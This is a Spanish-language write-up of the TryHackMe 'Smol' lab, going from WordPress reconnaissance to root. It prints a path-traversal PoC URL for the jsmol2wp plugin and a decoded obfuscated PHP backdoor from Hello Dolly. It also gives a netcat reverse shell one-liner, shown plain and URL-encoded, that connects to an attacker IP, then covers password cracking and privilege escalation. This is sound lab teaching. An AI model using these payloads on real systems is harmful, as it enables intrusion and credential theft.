---
title: Smol - TryHackMe
layout: post
permalink: /writeups/THM/smol
date: 2025-04-21 11:00:00 -0000
description: >
  Write up en español para Smol - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sV -Pn -T4 -O 10.10.106.57
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 18:20 CAT
Nmap scan report for 10.10.106.57
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Portal web

Para poder visitar el portal web debemos añadir la ip en nuestro archivo `/etc/hosts` con el dominio `smol.thm`.

```bash
echo "10.10.106.57 www.smol.thm" >> /etc/hosts
```

Tanto en la descripción del CTF como en la web encontramos que se trata de sitio web Wordpress.

![alt text](/assets/img/writeups/tryhackme/smol/image.png)

Sabiendo esto podemos intentar usar directamente la herramienta `wpscan`.

```bash
wpscan --url http://www.smol.thm/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.10.106.57]
[+] Started: Mon Apr 21 18:29:41 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

Vemos que ha detectado un plugin y si buscamos vulnerabilidades sobre el mismo encontramos [CVE-2018-20463](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/).

Se trata de una vulnerabilidad que nos permite leer archivos del sistema a través de path traversal así como realizar SSRF.


Probamos el siguiente PoC `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php`.

![alt text](/assets/img/writeups/tryhackme/smol/image-1.png)

Si probamos esa contraseña en el login de wordpress podemos acceder a la configuración.

![alt text](/assets/img/writeups/tryhackme/smol/image-2.png)

Encontramos un post privado.

![alt text](/assets/img/writeups/tryhackme/smol/image-3.png)

Parecen ser las tareas del webmaster y en una de ellas indica que hay que revisar el código del plugin **Hello Dolly**.

![alt text](/assets/img/writeups/tryhackme/smol/image-4.png)

Haciendo uso de la anterior vulnerabilidad podemos extraer el contenido del plugin `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`.

```php
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

Si la decodificamos obtenemos el siguiente código:

```php
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"])
```

Los nombres de las variables están escritas con escapes octales y hexadecimales, que son formas de codificar caracteres en PHP.

- \143 es un valor octal.

- \x6d es un valor hexadecimal.

```php
$_GET["\143\155\x64"] = $_GET["cmd"]

if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
```

Este código permite ejecutar comandos del sistema directamente desde la URL.

## Explotando el plugin Hello Dolly

Lo normal sería pensar que podemos llamar a esta función de cmd desde el propio plugin y ejecutar comandos del sistema como `http://www.smol.thm/wp-content/plugins/hello.php?cmd=pid`, pero no lo permite.

Si nos fijamos en el dashboard del administrador Worpress observamos que el plugin está cargado en el backend.

![alt text](/assets/img/writeups/tryhackme/smol/image-5.png)

Por lo tanto podemos intentar llamar a la función de cmd desde aquí.

El comando que utilizarmos es `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.66.202 4444 >/tmp/f` y lo debemos codificar en URL.

```plaintext
http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.23.66.202%204444%20%3E%2Ftmp%2Ff
```
Finalmente obetenmos la shell en el listener.

![alt text](/assets/img/writeups/tryhackme/smol/image-6.png)

La estabilizamos.

![alt text](/assets/img/writeups/tryhackme/smol/image-7.png)

## Escalando privilegios

Como ya teníamos las credenciales de la base de datos podemos ver el contenido en busca de algunas credenciales que nos puedan servir.

![alt text](/assets/img/writeups/tryhackme/smol/image-8.png)

Con esos datos creamos un fichero con el `usuario:passwordhash` y ejecutamos john.

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](/assets/img/writeups/tryhackme/smol/image-9.png)

Obtenemos las credenciales del usuario Diego.

## Escalando privilegios 2

Explorando el sistema encontramos la user flag.

![alt text](/assets/img/writeups/tryhackme/smol/image-10.png)

Además de una clave SSH para el usuario Think.

Copiamos la clave id_rsa y le damos permisos 600.

![alt text](/assets/img/writeups/tryhackme/smol/image-11.png)

![alt text](/assets/img/writeups/tryhackme/smol/image-12.png)

Ahora con el usuario diego encontramos en la configuración **PAM** para su que este usuario puede iniciar sesión como **gege** sin necesidad de contraseña.

![alt text](/assets/img/writeups/tryhackme/smol/image-13.png)

## Escalando privilegios 3

Como el usuario **Gege** encontramos un archivo zip que vamos a descargar en nuestra máquina.

![alt text](/assets/img/writeups/tryhackme/smol/image-14.png)

Si intentamos descomprimirlo nos pregunta por la contraseña del archivo.

```bash
 unzip wordpress.old.zip
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password:
```

Vamos a intentar crackear la contraseña.

```bash
zip2john wordpress.old.zip > archive_hash
```

![alt text](/assets/img/writeups/tryhackme/smol/image-15.png)

Ahora si lo podemos descomprimir y encontramos en el archivo de configuración una contrasñe y usuario diferentes de la base de datos.

![alt text](/assets/img/writeups/tryhackme/smol/image-16.png)

Ahora simplemente iniciamos sesión como `su xavi` y su contraseña.

## Escalando privilegios ROOT

Ahora como xavi podemos ejecutar sudo -l ya que tenemos su contraseña.

![alt text](/assets/img/writeups/tryhackme/smol/image-17.png)

Como vemos tenemos completo acceso root con sudo.

![alt text](/assets/img/writeups/tryhackme/smol/image-18.png)

